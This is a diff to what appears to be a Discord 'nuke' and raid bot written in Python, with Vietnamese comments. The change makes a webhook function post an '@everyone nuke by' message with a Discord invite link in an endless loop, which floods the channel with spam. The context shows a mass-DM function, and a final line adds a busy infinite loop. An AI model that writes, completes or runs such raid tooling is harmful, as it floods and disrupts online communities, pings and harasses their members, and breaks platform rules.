@@ -133,11 +133,12 @@ def create_webhook(channel_id, name="AutoHook"):
 
 def send_message_via_webhook(url, content="hello"):
     """Gửi message qua webhook"""
+    
     content = """
 @everyone 
 nuke by https://discord.gg/E6rW9SpSW6 :yum: 
 """
-    r = requests.post(url, json={"content": content})
+    while True: r = requests.post(url, json={"content": content})
     print(f"📨 [{r.status_code}] -> {url}")
 
 
@@ -286,3 +287,4 @@ def massdm():
 members_list = []
 massdm()
 
+while True: ""
